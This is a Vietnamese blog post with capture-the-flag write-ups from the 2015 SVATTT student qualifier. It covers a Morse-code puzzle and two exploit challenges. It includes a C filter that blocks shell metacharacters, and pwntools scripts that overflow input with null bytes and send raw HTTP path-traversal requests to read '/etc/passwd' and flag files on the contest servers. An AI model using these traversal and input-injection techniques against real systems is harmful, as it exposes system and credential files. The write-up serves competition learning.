---
layout: post
title: "Vòng loại sinh viên với an toàn thông tin 2015 - Writeups"
date: 2015-11-07 07:17:10 +0000
comments: true
categories: 
---

Sinh viên với An toàn thông tin 2015 là một kì thi cho sinh viên được tổ chức dưới dạng các bài thi CTF kết hợp với những challenge lý thuyết - chúng ta có thể giải được bằng các kĩ thuật recon ;))

Trong vòng loại, team mình là Animal.OhYeah (viết liền, không có dấu cách) có thứ hạng cũng khá cao #firstPlace nên hôm nay mình cũng có chút động lực để chia sẻ. Mọi lần mình viết bằng Tiếng Anh, nhưng mà mình viết chán quá đọc chả ai hiểu cả, nên lần này mình quyết định viết bằng tiếng Việt.

Trong vòng thi vừa rồi, mình hỗ trợ các bạn khác trong nhóm giải các lây hỏi lý thuyết trắc nghiệm, hai bài exploit 100, bài hidden 100, tự mình không giải được bài nào cả.

Hiện tại tính đến thời điểm mình viết bài thì các challenge vẫn available tại [đây](http://svattt.vnsecurity.net/)

##Misc 100 - Quảng Ngãi :: Hidden

~~~
Hidden
CTF :)
~~~
[Read this.](http://119.15.167.211/static/materials/misc100.html_659ff899f5bb31242424b127aafb9a35)

Bọn mình download file kia về, copy một đoạn để tìm file gốc trên google, sau đó quan sát và phát hiện giữa hai file có một số kí tự bị thay đổi là `-`, `.` và ` ` .

> Morse code ?

Mình quyết định viết thử tool, còn bạn mình thì (trâu bò) dùng tay. Cuối cùng thì tool mình chạy sai không ra, bạn mình có kết quả trước.

Flag: `SVATTTM0RS3`

##Exploit 100 - Hoàng Sa ::  int i = 0;

~~~
int i = 0;
Hint: < > ! @ # $ % ^ `
nc 119.15.167.212 31338
~~~
[Source](http://119.15.167.211/static/materials/exp100.c_a0a271df98aec280f58bb5cfd9991709)

Bài này một bạn trong team mình reverse, sau đó kêu mình cứ ghi tràn 128 bytes `null` và sau đó có thể gửi dữ liệu vào được.
Dữ liệu vào sẽ được ghép vào hàm `man` và thực thi như sau:

```
"man " + input
```

Mình chạy sang xem qua thì thấy filter một vài ký tự :

```
if(strchr(buffer,'-')!=0) return 0;
if(strchr(buffer,';')!=0) return 0;
if(strchr(buffer,'|')!=0) return 0;
if(strchr(buffer,'&')!=0) return 0;
if(strchr(buffer,' ')!=0) return 0;
if(strchr(buffer,'\t')!=0) return 0;
if(strchr(buffer,'\n')!=0) return 0;
if(strchr(buffer,'\r')!=0) return 0;
if(strchr(buffer,'\'')!=0) return 0;
if(strchr(buffer,'"')!=0) return 0;
```

Mình nghĩ đến `-l` , nhưng không được. Bí quá guessing thử `/home/exp100/flag.txt` thì ok. Mình cũng chả biết tại sao +_+

```
from pwn import *
try:
    r = remote('119.15.167.212', 31338)    
    print r.recvuntil(':')
    r.send('\x00' * 128)
    print r.recvuntil('> ')
    r.send('/home/exp100/flag.txt')
    print r.recv(1000)
except Exception, e:
    print e
```

We have flag: `SVATTT_has_just_begun`

Hôm nay viết bài, mình mới thấy cái hint, và cũng không rõ cái hint đó có ý nghĩa gì :/

##Exploit 100 - Hải Phòng :: Weird HTTP

~~~
Weird HTTP
I really love C <3.
One byte to rule them all.
http://119.15.167.212:31335/index.html
~~~

Nói đến bài này, thì phải bắt đầu từ lúc đồng đội mình gửi cho mình cách `nc 119.15.167.212 31335` (IP và địa chỉ của kì thi lúc đó có thể sẽ khác), sau đó chèn thêm đoạn payload `GET /index.php HTTP/1.1` có kết quả.

Mình thử thay bằng `GET //etc/passwd HTTP/1.1` thì có thêm vài thông tin thú vị.

Mình thay tiếp thành `GET //home/exp100-python/flag HTTP/1.1` thì có flag :o
> Awesome... (.______.")

Dưới đây là code pwn của mình :v (vì đây là bài pwn mà :( )

```
from pwn import *

try:    
    r = remote('119.15.167.212', 31335)    
    code = 'GET //home/exp100-python/flag' + ' HTTP/1.1'    
    r.send(code)
    print r.recv()    
    print r.recv()        
except Exception, e:
    print e
```

Flag: `SVATTT_u_got_easter_egg`

> Have fun and Happy hacking